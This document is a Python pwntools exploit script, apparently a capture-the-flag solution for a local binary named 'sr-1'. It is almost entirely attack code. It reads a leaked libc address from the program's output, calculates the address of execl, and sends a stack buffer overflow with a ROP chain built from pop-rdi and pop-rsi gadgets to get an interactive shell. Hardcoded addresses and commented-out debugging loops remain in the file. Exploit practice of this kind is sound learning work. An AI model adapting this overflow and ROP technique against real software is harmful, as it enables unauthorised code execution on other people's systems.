#!/usr/bin/env python

from pwn import *

p = process("./sr-1")

"""
0x0000000000400781 : pop rsi ; pop r15 ; ret
0x0000000000400783 : pop rdi ; ret
0x400020:   "@"
0x7f696e1dd8f8 <+440>:  add    $0x1,%r12d
0x7f696e289a20 <__GI_execl>
"""

pr = p64(0x0000000000400783)
ppr = p64(0x0000000000400781)
#execl = (0x7fc7386bba20)
#libc = (0x00007fc73860f8e8)
execl = (0x7fcce2b24a20)
libc = (0x7ffd80af7a68)
offset = libc - execl
#print(offset)
string = p64(0x400020)

print(p.recv())
p.sendline("250")

line = p.recv()
#print(repr(line))
"""
i=0
while i < 200:
    int_value = u64(line[i:i+8])
    print(hex(int_value))
    print(i)
    i += 8
"""
val = u64(line[184:184+8])
print(hex(val))

calc_execl = val - 0x7f45ea26e830 + 0x7f45ea31aa20
#calc_execl = val - 0x7f852cedb830 + 0x7f852cf87770
print(hex(calc_execl))

buf = "A"*0x80 + "BBBBBBBB"
buf += pr
buf += string
buf += ppr
buf += p64(0)
buf += p64(0)
buf += p64(calc_execl)


print(buf)
p.sendline(buf)

p.interactive()
